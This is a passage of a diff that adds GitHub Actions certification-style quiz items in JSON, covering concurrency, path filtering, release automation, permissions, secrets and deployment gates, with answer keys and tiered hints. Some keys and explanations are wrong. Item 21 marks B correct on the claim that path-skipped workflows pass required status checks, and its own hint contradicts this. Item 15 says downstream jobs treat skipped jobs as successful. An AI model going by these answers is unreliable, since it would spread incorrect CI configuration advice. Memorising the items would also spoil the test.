+          "content": "<ul><li>SHA pinning: immutable — even if the action owner is compromised, the pinned commit is fixed. Update via Dependabot action version updates.</li>\n              <li>Organization allowed list: Settings &gt; Actions &gt; General — allow specific actions/reusable workflows or actions by verified creators only.</li>\n              <li>permissions: key at workflow or job level overrides the default GITHUB_TOKEN permissions — least privilege per job.</li>\n              <li>Dependabot for Actions: automatically creates PRs to update pinned action SHAs when new versions are released — balancing security with freshness.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Supply Chain",
+        "Security",
+        "Best Practices"
+      ]
+    },
+    {
+      "id": 14,
+      "categoryRef": "cat-admin",
+      "difficulty": "intermediate",
+      "title": "Concurrency Control",
+      "scenario": "A deployment workflow should only run one instance at a time per environment — if a new deployment is triggered while one is running, the new one should wait (not cancel the running deployment). However, for CI (build/test) workflows, if a new push arrives while CI is running on the same branch, the old run should be cancelled (superseded by the newer code). These are two different concurrency behaviors needed in the same repository.",
+      "questionText": "Which concurrency configuration provides the correct behavior for each workflow type?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Deployment workflow: concurrency group keyed on environment name with cancel-in-progress: false (queue, don't cancel). CI workflow: concurrency group keyed on branch name with cancel-in-progress: true (cancel old runs when new push arrives)"
+        },
+        {
+          "letter": "B",
+          "text": "concurrency: group with cancel-in-progress: true for all workflows"
+        },
+        {
+          "letter": "C",
+          "text": "No concurrency controls — let all runs execute simultaneously"
+        },
+        {
+          "letter": "D",
+          "text": "Use workflow_dispatch to manually prevent overlapping runs"
+        }
+      ],
+      "correctAnswer": "A",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "concurrency group + cancel-in-progress controls the behavior: false = queue (deployments), true = cancel previous (CI on same branch)."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "For deployments: concurrency: group: deploy-${{ inputs.environment }}, cancel-in-progress: false — runs with the same environment group queue (wait for the current deployment to finish before starting). For CI: concurrency: group: ci-${{ github.ref }}, cancel-in-progress: true — a new push to the same branch cancels any running CI for that branch (since the older commit is superseded). The group key determines what runs are considered \"concurrent\" — environment name for deployments (one deploy at a time per env), branch ref for CI (one run per branch). Different workflows in the same repo can have different concurrency configurations."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Concurrency group: string expression — same string = same group. Use context variables to make it dynamic.</li>\n              <li>cancel-in-progress: true cancels the RUNNING workflow when a new one enters the group; false makes the new one PENDING until running completes.</li>\n              <li>Common CI pattern: group: ${{ github.workflow }}-${{ github.ref }} — unique per workflow per branch.</li>\n              <li>Queue depth: if cancel-in-progress is false and multiple runs queue, only the latest pending run actually executes (intermediate ones are cancelled).</li></ul>"
+        }
+      ],
+      "tags": [
+        "Concurrency",
+        "Workflow Control",
+        "Queue"
+      ]
+    },
+    {
+      "id": 15,
+      "categoryRef": "cat-workflows",
+      "difficulty": "intermediate",
+      "title": "Conditional Execution",
+      "scenario": "A monorepo contains a frontend (React) and backend (Python) in separate directories. The CI workflow should: only run frontend tests when files in frontend/ change, only run backend tests when files in backend/ change, always run integration tests regardless of what changed, and skip CI entirely for documentation-only changes (docs/ directory, *.md files).",
+      "questionText": "Which approach provides path-based conditional job execution in a monorepo?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Two separate workflows with path filters in the on: trigger (paths: ['frontend/**'] and paths: ['backend/**'])"
+        },
+        {
+          "letter": "B",
+          "text": "Use git diff in a script step to determine what changed and skip steps with exit codes"
+        },
+        {
+          "letter": "C",
+          "text": "Always run all tests regardless of changes for simplicity"
+        },
+        {
+          "letter": "D",
+          "text": "Single workflow using dorny/paths-filter action to detect changed paths, with job-level if: conditions based on filter outputs, paths-ignore for docs-only changes on the trigger, and an integration-test job with no conditions (always runs)"
+        }
+      ],
+      "correctAnswer": "D",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "paths-filter action detects which directories changed, outputting booleans that jobs reference in if: conditions for selective execution."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The workflow trigger uses paths-ignore: ['docs/**', '**.md'] to skip CI entirely for documentation-only changes. Within the workflow, a detect-changes job uses dorny/paths-filter with filters for frontend (frontend/**) and backend (backend/**). The frontend-test job has if: needs.detect-changes.outputs.frontend == 'true'. The backend-test job has if: needs.detect-changes.outputs.backend == 'true'. The integration-test job has no condition — it always runs. This provides granular, path-based conditional execution while maintaining a single workflow file for the entire monorepo."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>paths-ignore on trigger: if ALL changed files match ignore patterns, the workflow is skipped entirely (no run created).</li>\n              <li>dorny/paths-filter: compares HEAD against base ref (for PRs) or previous commit (for push) to determine changed files.</li>\n              <li>Job-level if: when false, the job is skipped (not failed) — downstream jobs with needs: see it as successful.</li>\n              <li>Alternative: workflow-level paths: filter runs the workflow only when specific paths change — but cannot have per-job path conditions natively.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Monorepo",
+        "Path Filtering",
+        "Conditional"
+      ]
+    },
+    {
+      "id": 16,
+      "categoryRef": "cat-cicd",
+      "difficulty": "intermediate",
+      "title": "Release Automation",
+      "scenario": "A team wants fully automated releases: when a PR is merged to main with a conventional commit message (feat:, fix:, breaking:), the workflow should automatically determine the next semantic version, generate a changelog from commit messages, create a GitHub Release with the changelog as body, publish the npm package to the registry, and update the package.json version. No manual intervention should be required.",
+      "questionText": "Which workflow automation achieves fully hands-off semantic releases?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Manual version bumps in PRs with a release workflow triggered by version tag pushes"
+        },
+        {
+          "letter": "B",
+          "text": "semantic-release or release-please action triggered on push to main — analyzes conventional commit messages, determines version bump (major/minor/patch), generates changelog, creates GitHub Release, publishes to npm, and commits version update back to main"
+        },
+        {
+          "letter": "C",
+          "text": "GitHub's built-in \"Generate release notes\" button clicked manually after each feature is merged"
+        },
+        {
+          "letter": "D",
+          "text": "A cron-scheduled workflow that releases whatever is on main every Friday"
+        }
+      ],
+      "correctAnswer": "B",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "semantic-release and release-please analyze commit messages to fully automate versioning, changelogs, and publishing — zero manual intervention."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "Tools like semantic-release or google-github-actions/release-please analyze conventional commit messages since the last release: \"feat:\" triggers a minor version bump, \"fix:\" triggers a patch, \"BREAKING CHANGE:\" triggers a major. They automatically: determine the next version (1.2.3 → 1.3.0 for a feat), generate a structured changelog from commit messages grouped by type, create a GitHub Release with the changelog as the body, execute publish steps (npm publish with the new version), and commit the version update to package.json. Triggered on push to main, the entire flow is automated — developers just write conventional commit messages in their PRs."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Conventional Commits spec: type(scope): description — types: feat, fix, docs, chore, refactor, test, perf, ci.</li>\n              <li>semantic-release plugins: @semantic-release/npm (publish), @semantic-release/github (create release), @semantic-release/changelog (CHANGELOG.md).</li>\n              <li>release-please (Google): creates a \"Release PR\" with version bump and changelog — merge the PR to trigger the actual release.</li>\n              <li>NPM_TOKEN secret: required for npm publish; use NODE_AUTH_TOKEN environment variable with the registry-url set in setup-node.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Semantic Release",
+        "Automation",
+        "Publishing"
+      ]
+    },
+    {
+      "id": 17,
+      "categoryRef": "cat-actions",
+      "difficulty": "intermediate",
+      "title": "Action Marketplace Publishing",
+      "scenario": "A team built an internal action for code quality checks that they want to share with the community. Before publishing to the GitHub Marketplace, they need to ensure: the action has clear documentation (inputs, outputs, usage examples), it is tested against multiple runner OS versions, it follows security best practices (no hardcoded secrets, minimal permissions), and it can be consumed by both GitHub.com and GitHub Enterprise Server users.",
+      "questionText": "What are the requirements and best practices for publishing an action to the GitHub Marketplace?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Push the action repository to GitHub — it automatically appears in the Marketplace"
+        },
+        {
+          "letter": "B",
+          "text": "Only Docker actions can be published to the Marketplace"
+        },
+        {
+          "letter": "C",
+          "text": "action.yml with complete metadata (name, description, inputs, outputs, branding), README with usage examples and permissions documentation, CI testing across OS versions, tagged releases for version pinning, and the repository must be public with the action.yml in the root directory"
+        },
+        {
+          "letter": "D",
+          "text": "Contact GitHub support to request Marketplace listing approval"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Marketplace publishing requires: complete action.yml metadata, public repository, tagged releases, and clear documentation in README."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "Marketplace requirements: action.yml in the repository root with complete metadata (name, description, author, inputs with descriptions, outputs, branding icon and color). The repository must be public. A comprehensive README documents: what the action does, all inputs/outputs with defaults, usage examples in workflow syntax, required permissions, and compatibility notes. Tagged releases (v1, v1.0.0) enable version pinning. CI should test the action itself across Ubuntu/Windows/macOS. The action must not contain hardcoded credentials and should document minimum GITHUB_TOKEN permissions needed. The \"Publish to Marketplace\" checkbox appears when creating a release if action.yml is valid."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Branding: icon (from Feather icons set) and color (white, yellow, blue, green, orange, red, purple, gray-dark) — displayed in Marketplace.</li>\n              <li>Categories: up to 2 categories for Marketplace discoverability (CI, Testing, Deployment, Security, etc.).</li>\n              <li>GHES compatibility: JavaScript actions work on GHES; Docker actions may have registry access issues behind firewalls.</li>\n              <li>Verification: GitHub verifies the organization (not individual actions) — verified badge shows the creator is the authentic organization.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Marketplace",
+        "Publishing",
+        "Documentation"
+      ]
+    },
+    {
+      "id": 18,
+      "categoryRef": "cat-security",
+      "difficulty": "intermediate",
+      "title": "Workflow Permissions and GITHUB_TOKEN",
+      "scenario": "A workflow needs to: read repository code (checkout), create a pull request with auto-generated changes, add a comment to the PR, and push a Docker image to ghcr.io. The organization has set the default GITHUB_TOKEN permission to read-only for security. The workflow currently fails with 403 errors on the PR creation and package push steps.",
+      "questionText": "Which permissions configuration grants exactly the minimum required access for all four operations?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Workflow-level permissions: contents: write (for push), pull-requests: write (for creating PR and commenting), and packages: write (for ghcr.io push) — contents: read is implied by write"
+        },
+        {
+          "letter": "B",
+          "text": "Set the organization default back to read-write for all workflows"
+        },
+        {
+          "letter": "C",
+          "text": "Use a Personal Access Token (PAT) stored as a secret for all operations"
+        },
+        {
+          "letter": "D",
+          "text": "permissions: write-all to grant all permissions at once"
+        }
+      ],
+      "correctAnswer": "A",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Declare exactly the permissions needed: contents for code operations, pull-requests for PR operations, and packages for registry operations."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The permissions: key at workflow or job level explicitly sets GITHUB_TOKEN scope. For this workflow: contents: write enables git push (needed for the PR's branch). pull-requests: write enables both creating a PR (POST /repos/.../pulls) and adding a comment (POST /repos/.../issues/.../comments). packages: write enables pushing Docker images to ghcr.io (authenticated via GITHUB_TOKEN). All other permissions remain at their default (none or read) — this is least-privilege. This approach is more secure than write-all (grants everything) or a PAT (long-lived, broadly scoped)."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Available scopes: actions, checks, contents, deployments, id-token, issues, packages, pull-requests, repository-projects, security-events, statuses.</li>\n              <li>When permissions: is specified, ONLY listed permissions are granted — all others are implicitly 'none'.</li>\n              <li>Job-level permissions override workflow-level — useful for giving different jobs different scopes.</li>\n              <li>Note: pull-requests: write is needed for PR comments because PR comments use the Issues API (PRs are issues with code).</li></ul>"
+        }
+      ],
+      "tags": [
+        "Permissions",
+        "GITHUB_TOKEN",
+        "Least Privilege"
+      ]
+    },
+    {
+      "id": 19,
+      "categoryRef": "cat-admin",
+      "difficulty": "intermediate",
+      "title": "Usage Monitoring and Cost Control",
+      "scenario": "An organization spends $15,000/month on GitHub Actions minutes. The billing dashboard shows usage is growing 20% monthly. The platform team needs to: identify which repositories consume the most minutes, detect inefficient workflows (long-running jobs, redundant runs), set spending limits to prevent budget overruns, and optimize the highest-cost workflows first.",
+      "questionText": "Which approach provides visibility and control over GitHub Actions spending?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Review the monthly invoice without per-workflow breakdown"
+        },
+        {
+          "letter": "B",
+          "text": "GitHub organization billing dashboard for per-repository usage, Actions usage metrics API for per-workflow/per-job analysis, spending limits in billing settings, and workflow optimization (caching, concurrency cancellation, path filtering) targeting the top consumers identified by the API data"
+        },
+        {
+          "letter": "C",
+          "text": "Switch all workflows to self-hosted runners to eliminate per-minute charges"
+        },
+        {
+          "letter": "D",
+          "text": "Reduce the number of workflows allowed per repository"
+        }
+      ],
+      "correctAnswer": "B",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Billing dashboard shows per-repo usage; API provides per-workflow detail; spending limits cap costs; optimization reduces the bill."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The billing dashboard (Settings &gt; Billing &gt; Actions) shows per-repository minute consumption and storage usage. The REST API (GET /orgs/{org}/actions/billing/usage) provides programmatic access for building custom dashboards with per-workflow and per-job breakdowns. Spending limits (configurable per organization) cap monthly spending — workflows are blocked when the limit is reached (preventing surprise bills). Armed with data showing which workflows consume the most, the team applies targeted optimizations: caching (reduce install time), concurrency with cancel-in-progress (cancel redundant runs), path filters (skip unnecessary runs), and larger runner considerations (faster = fewer minutes despite higher per-minute cost)."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Minute multipliers: Linux 1x, Windows 2x, macOS 10x — moving macOS jobs to Linux where possible saves 90% on those jobs.</li>\n              <li>Storage billing: artifacts and caches count toward storage limits (500MB free, then billed per GB/month).</li>\n              <li>Spending limit: $0 = free tier only; specific amount = hard cap; unlimited = no cap (dangerous without monitoring).</li>\n              <li>Larger runners (4/8/16 CPU): higher per-minute cost but can reduce total minutes for parallelizable workloads — net savings possible.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Billing",
+        "Cost Control",
+        "Monitoring"
+      ]
+    },
+    {
+      "id": 20,
+      "categoryRef": "cat-workflows",
+      "difficulty": "intermediate",
+      "title": "Environment Variables and Contexts",
+      "scenario": "A workflow needs to use different configuration values based on the trigger event: for push to main, use the production API URL; for pull requests, use the staging API URL; for manual dispatch, allow the user to specify the URL as an input. The API URL is used in multiple steps across two jobs. Additionally, a step needs to conditionally set a variable based on the output of a previous step.",
+      "questionText": "Which approach correctly manages environment variables across events, jobs, and steps?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Workflow-level env: for defaults, job-level env: overrides based on github.event_name context, step-level dynamic variables via $GITHUB_ENV for cross-step sharing, and workflow_dispatch inputs accessed via github.event.inputs.api_url"
+        },
+        {
+          "letter": "B",
+          "text": "Hardcode the URL in each step that needs it with if conditions"
+        },
+        {
+          "letter": "C",
+          "text": "Use repository secrets for all three URLs and select with if conditions"
+        },
+        {
+          "letter": "D",
+          "text": "Set all variables in the first step and pass via artifacts to subsequent jobs"
+        }
+      ],
+      "correctAnswer": "A",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Environment variables cascade: workflow &gt; job &gt; step level, with dynamic setting via $GITHUB_ENV for conditional values."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "Workflow-level env: sets a default API_URL. Job-level env: can override based on conditions (env: API_URL: ${{ github.event_name == 'push' &amp;&amp; 'https://prod.example.com' || 'https://staging.example.com' }}). For workflow_dispatch, github.event.inputs.api_url provides the user-specified value. Within a step, writing to $GITHUB_ENV (echo \"API_URL=value\" &gt;&gt; $GITHUB_ENV) makes the variable available to ALL subsequent steps in the same job. For cross-job sharing, use job outputs. This layered approach (static defaults, event-conditional overrides, dynamic setting) handles all three trigger scenarios cleanly."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>$GITHUB_ENV: variables set here are available in subsequent steps (not the current step) — key=value format, one per line.</li>\n              <li>$GITHUB_OUTPUT: for job outputs consumed by downstream jobs (echo \"name=value\" &gt;&gt; $GITHUB_OUTPUT).</li>\n              <li>Expression syntax: ${{ env.API_URL }} in workflow YAML; $API_URL in shell scripts (different expansion contexts).</li>\n              <li>Multiline env vars: use a delimiter pattern — echo \"VAR&lt;&lt;EOF\" &gt;&gt; $GITHUB_ENV, then the value, then echo \"EOF\" &gt;&gt; $GITHUB_ENV.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Environment Variables",
+        "Contexts",
+        "Configuration"
+      ]
+    },
+    {
+      "id": 21,
+      "categoryRef": "cat-cicd",
+      "difficulty": "intermediate",
+      "title": "Monorepo CI Strategy",
+      "scenario": "A monorepo contains 5 microservices, each with independent build, test, and deploy cycles. Requirements: only build/test services whose code changed, deploy changed services independently (not all-or-nothing), share common build infrastructure (docker base images, shared libraries), and provide a single \"green check\" on PRs that accounts for all affected services passing their respective tests.",
+      "questionText": "Which CI/CD architecture handles independent microservice lifecycles in a monorepo?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Separate repositories per microservice with their own CI workflows"
+        },
+        {
+          "letter": "B",
+          "text": "Five separate workflow files — one per service — each with path filters in the on: trigger"
+        },
+        {
+          "letter": "C",
+          "text": "A single workflow that builds and deploys all 5 services on every change"
+        },
+        {
+          "letter": "D",
+          "text": "Single workflow with path-based change detection (dorny/paths-filter), matrix strategy generating jobs only for changed services, shared docker build step producing base images cached across services, and a final required status check job that aggregates all service results"
+        }
+      ],
+      "correctAnswer": "B",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Separate workflow files per service with path filters provides: independent triggers, independent deployments, and independent status checks per service."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "Five workflow files (ci-service-a.yml, ci-service-b.yml, etc.) each with on: push: paths: ['services/service-a/**', 'shared/**']. When only service-a changes, only its workflow runs. Each workflow handles its own build, test, and deploy lifecycle independently. Shared infrastructure (docker base images) is built in a separate shared workflow triggered by changes to shared/. For the \"green check\" requirement: use branch protection required status checks — list all 5 workflow status checks; GitHub treats skipped workflows (due to path filter not matching) as passing for required checks. This gives per-service independence with monorepo simplicity."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>paths: trigger filter: workflow only runs when files matching the pattern change — zero cost for unrelated changes.</li>\n              <li>Required status checks + path filters: use paths-filter action inside a single \"gate\" workflow that always runs and reports sub-check results.</li>\n              <li>Shared dependencies: include 'shared/**' in each service's path filter so changes to shared libraries trigger all dependent services.</li>\n              <li>Deploy independence: each service workflow has its own environment and deployment job — services deploy independently without coordination.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Monorepo",
+        "Microservices",
+        "CI Architecture"
+      ]
+    },
+    {
+      "id": 22,
+      "categoryRef": "cat-actions",
+      "difficulty": "intermediate",
+      "title": "Reusable Workflow Secrets Handling",
+      "scenario": "A reusable deployment workflow needs access to cloud credentials and a database password. The calling workflow has these as repository or environment secrets. The reusable workflow must receive these secrets without the calling workflow needing to list every secret individually (there are 15 secrets). Additionally, some secrets should only be available during the production deployment job, not during the build or test stages.",
+      "questionText": "Which secrets passing approach balances convenience with security for reusable workflows?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Hardcode secrets in the reusable workflow repository as environment variables"
+        },
+        {
+          "letter": "B",
+          "text": "Pass each of the 15 secrets individually in the calling workflow's uses: with: section"
+        },
+        {
+          "letter": "C",
+          "text": "Use secrets: inherit in the calling workflow to pass all secrets, with the reusable workflow using GitHub Environments to scope production secrets to only the production deployment job (environment protection rules restrict access)"
+        },
+        {
+          "letter": "D",
+          "text": "Store all secrets in a vault and have each job fetch them independently"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "secrets: inherit passes all caller secrets without listing them; environment-scoped secrets restrict sensitive credentials to the appropriate job."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "secrets: inherit on the calling workflow's uses: declaration passes ALL repository and organization secrets to the reusable workflow without explicitly listing them — solving the 15-secret enumeration problem. Within the reusable workflow, the production deployment job references environment: production — this means environment-specific secrets (production database password) are only available during that job and require environment protection rule approval. Build and test jobs don't reference the production environment, so they cannot access production secrets even though secrets: inherit was used. This combines convenience (inherit all) with security (environment scoping restricts access per job)."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>secrets: inherit: passes all secrets from calling context — includes repository secrets, organization secrets, and environment secrets (if environment is specified in the calling job).</li>\n              <li>Environment secrets take precedence over repository secrets with the same name — enabling environment-specific overrides.</li>\n              <li>Reusable workflow secrets declaration: can define required secrets (with required: true) for validation — inherit still satisfies these requirements.</li>\n              <li>Security: even with inherit, secrets are not exposed in logs — GitHub Actions masks secret values in output automatically.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Secrets",
+        "Reusable Workflows",
+        "Inheritance"
+      ]
+    },
+    {
+      "id": 23,
+      "categoryRef": "cat-security",
+      "difficulty": "intermediate",
+      "title": "Dependency Review and Vulnerability Management",
+      "scenario": "A security policy requires: blocking PRs that introduce dependencies with known critical vulnerabilities, generating alerts for moderate vulnerabilities (but not blocking), creating a license compliance check (no GPL-3.0 licensed dependencies allowed in this proprietary project), and providing developers with clear information about what dependency introduced the vulnerability so they can fix it quickly.",
+      "questionText": "Which GitHub Actions security features implement this dependency governance policy?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "dependency-review-action in PR workflows (fail on critical CVEs, warn on moderate, block disallowed licenses), combined with Dependabot alerts for ongoing monitoring and Dependabot security updates for automated fix PRs"
+        },
+        {
+          "letter": "B",
+          "text": "Manual security review of all pull requests by the security team"
+        },
+        {
+          "letter": "C",
+          "text": "npm audit run in CI with --production flag only"
+        },
+        {
+          "letter": "D",
+          "text": "GitHub Advanced Security code scanning for dependency vulnerabilities"
+        }
+      ],
+      "correctAnswer": "A",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "dependency-review-action checks PRs for new vulnerabilities and license violations; Dependabot handles ongoing alerting and automated fix PRs."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The dependency-review-action (github/dependency-review-action) runs in PR workflows and compares dependencies before and after the change: fail-on-severity: critical blocks PRs introducing critical CVEs, warn-on-severity: moderate adds warnings without blocking, and deny-licenses: GPL-3.0 fails the check if a new GPL-3.0 dependency is added. The action output clearly shows which specific dependency (name, version) introduced each issue. Dependabot alerts provide ongoing monitoring of existing dependencies for newly discovered CVEs. Dependabot security updates automatically create PRs to bump vulnerable dependencies to patched versions — keeping the codebase secure between human-authored PRs."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>dependency-review-action: compares the dependency graph before/after the PR — only flags NEW vulnerabilities introduced by the PR, not pre-existing ones.</li>\n              <li>License checking: allow-licenses and deny-licenses options support SPDX identifiers (MIT, Apache-2.0, GPL-3.0, etc.).</li>\n              <li>Dependabot security updates: can be configured per ecosystem (npm, pip, Maven) with specific target branches and reviewer assignments.</li>\n              <li>GitHub Advisory Database: the source of vulnerability data — covers all major ecosystems (npm, PyPI, Maven, RubyGems, etc.).</li></ul>"
+        }
+      ],
+      "tags": [
+        "Dependency Review",
+        "Vulnerabilities",
+        "License Compliance"
+      ]
+    },
+    {
+      "id": 24,
+      "categoryRef": "cat-admin",
+      "difficulty": "intermediate",
+      "title": "Workflow Debugging and Troubleshooting",
+      "scenario": "A workflow fails intermittently — approximately 1 in 10 runs fail with a vague error. The team needs to: enable detailed debug logging for a specific failing run (without affecting all runs), access the runner's diagnostic logs for the failed run, re-run only the failed jobs (not the entire workflow), and add a step that runs only on failure to capture diagnostic information (environment variables, disk space, network connectivity).",
+      "questionText": "Which debugging techniques address intermittent workflow failures?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Add echo statements to every step and re-run the entire workflow"
+        },
+        {
+          "letter": "B",
+          "text": "Contact GitHub support for each failure"
+        },
+        {
+          "letter": "C",
+          "text": "Delete the workflow and recreate it from scratch"
+        },
+        {
+          "letter": "D",
+          "text": "Enable ACTIONS_RUNNER_DEBUG and ACTIONS_STEP_DEBUG secrets for verbose logging, download runner diagnostic logs from the failed run, use \"Re-run failed jobs\" to retry only failing jobs, and add a diagnostic step with if: failure() that captures system state (env, df, curl health endpoints) on failure only"
+        }
+      ],
+      "correctAnswer": "D",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Debug secrets enable verbose logging, re-run failed jobs saves time, and if: failure() steps capture diagnostics only when things go wrong."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "Setting ACTIONS_RUNNER_DEBUG: true and ACTIONS_STEP_DEBUG: true as repository secrets enables verbose debug logging for ALL runs (useful temporarily for debugging). Runner diagnostic logs are downloadable from the workflow run UI (gear icon &gt; Download log archive) and contain low-level runner operations. \"Re-run failed jobs\" (available in the UI and API) only re-executes jobs that failed — saving time and minutes. A diagnostic step with if: failure() runs only when a previous step in the job has failed — it can capture env vars, disk space (df -h), network state (curl health endpoints), and process lists (ps aux) to help diagnose intermittent issues like disk full, DNS failures, or resource exhaustion."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Debug logging: shows each action's inputs/outputs, environment variable resolution, expression evaluation, and HTTP requests.</li>\n              <li>if: failure() vs if: always(): failure() runs only on failure; always() runs regardless of status (useful for cleanup). cancelled() detects cancellation.</li>\n              <li>Re-run options: re-run all jobs, re-run failed jobs, or re-run a single job — each preserves the same commit SHA and event context.</li>\n              <li>Intermittent failures: common causes are rate limits (API 429), disk space (runner storage), network timeouts, and cache misses.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Debugging",
+        "Troubleshooting",
+        "Diagnostics"
+      ]
+    },
+    {
+      "id": 25,
+      "categoryRef": "cat-workflows",
+      "difficulty": "intermediate",
+      "title": "Workflow Dispatch with Custom Inputs",
+      "scenario": "A platform team creates an on-demand infrastructure provisioning workflow. Operators need to: select the environment (dev, staging, prod) from a dropdown, specify the instance count (1-10), choose the region from a predefined list (us-east-1, eu-west-1, ap-southeast-1), and optionally provide a custom configuration JSON blob. The workflow should validate all inputs before proceeding with provisioning.",
+      "questionText": "Which workflow_dispatch configuration provides typed inputs with validation?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Free-text inputs with validation logic in shell scripts"
+        },
+        {
+          "letter": "B",
+          "text": "Multiple workflow files — one per environment — with hardcoded values"
+        },
+        {
+          "letter": "C",
+          "text": "A separate web application that calls the workflow via API with validated parameters"
+        },
+        {
+          "letter": "D",
+          "text": "workflow_dispatch with typed inputs: environment (type: choice, options: [dev, staging, prod]), instance_count (type: number), region (type: choice, options: [us-east-1, eu-west-1, ap-southeast-1]), config_json (type: string, required: false) — with a validation job that checks instance_count range and JSON syntax before provisioning"
+        }
+      ],
+      "correctAnswer": "D",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "workflow_dispatch inputs support types: choice (dropdown), string, boolean, number — providing structured input collection in the GitHub UI."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "workflow_dispatch inputs with type: choice creates dropdown menus in the \"Run workflow\" UI — operators select from predefined options (no typos possible). type: number accepts numeric input. required: false makes inputs optional. A validation job at the start of the workflow checks: instance_count is between 1 and 10 (using an if: condition or a script that calls core.setFailed), config_json is valid JSON (using jq or JSON.parse), and the environment/region combination is allowed. Only after validation passes does the provisioning job proceed (needs: [validate]). This provides a self-service UI with guardrails."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Input types: choice (dropdown), string (text field), boolean (checkbox), number (numeric field) — environment (type: environment) auto-populates from repo environments.</li>\n              <li>Accessing inputs: ${{ github.event.inputs.environment }} or ${{ inputs.environment }} (inputs context works in reusable workflows too).</li>\n              <li>API trigger: POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches with inputs JSON — enables programmatic triggering.</li>\n              <li>Default values: each input can have a default: — pre-selected in the UI, used when triggered via API without specifying the input.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Workflow Dispatch",
+        "Inputs",
+        "Self-Service"
+      ]
+    },
+    {
+      "id": 26,
+      "categoryRef": "cat-cicd",
+      "difficulty": "intermediate",
+      "title": "Multi-Environment Deployment Pipeline",
+      "scenario": "A SaaS application deploys to three environments in sequence: staging (automatic on merge to main), production-canary (5% traffic, automatic after staging passes), and production-full (95% traffic, requires manual approval). Each environment has different Kubernetes clusters, different secrets, and different deployment configurations. Rollback must be possible at any stage.",
+      "questionText": "Which workflow design implements sequential multi-environment deployment with gates?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Single workflow with three jobs (staging → canary → full), each using a GitHub Environment with appropriate protection rules: staging (no protection, auto-deploy), canary (wait timer: 10 minutes for metrics observation), full (required reviewers for manual approval) — with environment-specific secrets and deployment configurations per job"
+        },
+        {
+          "letter": "B",
+          "text": "Three separate workflows triggered by different events"
+        },
+        {
+          "letter": "C",
+          "text": "Manual deployment by running scripts from a developer's machine per environment"
+        },
+        {
+          "letter": "D",
+          "text": "All three environments deploy simultaneously with feature flags controlling traffic"
+        }
+      ],
+      "correctAnswer": "A",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "GitHub Environments with protection rules provide: automatic deployment (no rules), wait timers (observation periods), and required reviewers (manual gates) — all in one workflow."
+        },
+        {
+          "level": 2,
